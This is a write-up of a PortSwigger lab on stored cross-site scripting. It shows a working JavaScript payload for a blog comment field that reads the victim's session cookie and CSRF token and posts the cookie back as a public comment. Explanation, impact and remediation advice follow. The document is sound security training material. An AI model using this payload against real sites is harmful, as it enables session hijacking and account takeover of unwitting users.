# Exploiting Cross-Site Scripting to Steal Cookies

**Lab:** [PortSwigger — Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
**Category:** Cross-Site Scripting (XSS)
**Vuln Type:** Stored XSS (blog comment field)
**Difficulty:** Practitioner

---

## Description

Stealing cookies is a classic way to exploit XSS. Most web applications use cookies for session handling, so an XSS vulnerability can be used to exfiltrate a victim's cookies to an attacker-controlled destination, then replay them to impersonate the victim.

In practice this technique has some notable limitations:

> - The victim might not be logged in.
> - Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
> - Sessions might be locked to additional factors like the user's IP address.
> - The session might time out before the attacker can hijack it.

This lab is deliberately configured *without* the `HttpOnly` flag, so `document.cookie` is readable from injected JavaScript — which is what makes this attack path work.

---

## Where It Lived

The **comment field** on blog posts. User input (name, email, website, comment) is stored and rendered back on the page with no sanitization or output encoding, allowing arbitrary HTML/JS to execute in the context of anyone who views the post.

---

## Objective

Exploit the stored XSS vulnerability to steal another user's session cookie.

---

## Payload Used

```html
<script>
    window.addEventListener('DOMContentLoaded', function(){
        var token = document.getElementsByName('csrf')[0].value;
        var data = new FormData();
        data.append('csrf', token);
        data.append('postId', 1);
        data.append('comment', document.cookie);
        data.append('name', 'victim');
        data.append('email', 'test@gmail.com');
        data.append('website', 'http://test.com');
        fetch('/post/comment', {
            method: 'POST',
            mode: 'no-cors',
            body: data
        });
    });
</script>
```

---

## How It Works

1. **Storage:** The comment field doesn't sanitize input, so the payload is stored as-is and executes in the browser of anyone who views the blog post.
2. **CSRF token grab:** Once the page loads, the script reads the page's own CSRF token from the comment form — the same token the victim's browser would use to legitimately submit a comment.
3. **Fake comment submission:** It builds a `FormData` object for a new comment submission, but instead of real comment text, it inserts `document.cookie` — the victim's own session cookie.
4. **Silent exfiltration:** The forged request is POSTed to `/post/comment` using the victim's session (cookies are sent automatically by the browser), so the victim ends up unknowingly submitting *their own cookie* as a public comment.
5. **`mode: 'no-cors'`:** This is set because the attacker doesn't need to *read* the response — cross-origin restrictions would block that anyway. All that's needed is for the POST request to fire successfully, which `no-cors` still allows.
6. **Collection:** The attacker simply opens the blog post and reads the comment — which now contains the victim's session cookie in plain text.

---

## Why This Works Here (vs. the Listed Limitations)

- **No `HttpOnly` flag** on the session cookie → `document.cookie` successfully returns the session token.
- **No IP-locking** on sessions → the stolen cookie can be reused from a different machine/location.
- The victim is guaranteed to be logged in by lab design (simulated victim visits the page with an active session).

This is exactly why the lab is solvable with a pure `document.cookie` payload — a real-world hardened app (HttpOnly + IP binding + short session timeout) would defeat this specific technique, forcing an attacker toward alternatives like CSRF-based actions or exploiting XSS for something other than cookie theft.

---

## Impact

If exploited in the wild, this would allow full **session hijacking**: an attacker could inject the stolen cookie into their own browser and impersonate the victim, gaining access to their account without needing credentials.

---

## Remediation

- **Output encode** all user-supplied input before rendering it back into HTML (context-aware encoding, e.g. HTML-entity encode `<`, `>`, `"`, `'`, `&`).
- Set the **`HttpOnly`** flag on session cookies so they can't be read via JavaScript.
- Set the **`Secure`** and **`SameSite`** attributes on cookies.
- Implement a strict **Content-Security-Policy (CSP)** to block inline `<script>` execution and restrict allowed script sources.
- Validate/sanitize input server-side, not just client-side, since client-side checks can be bypassed.
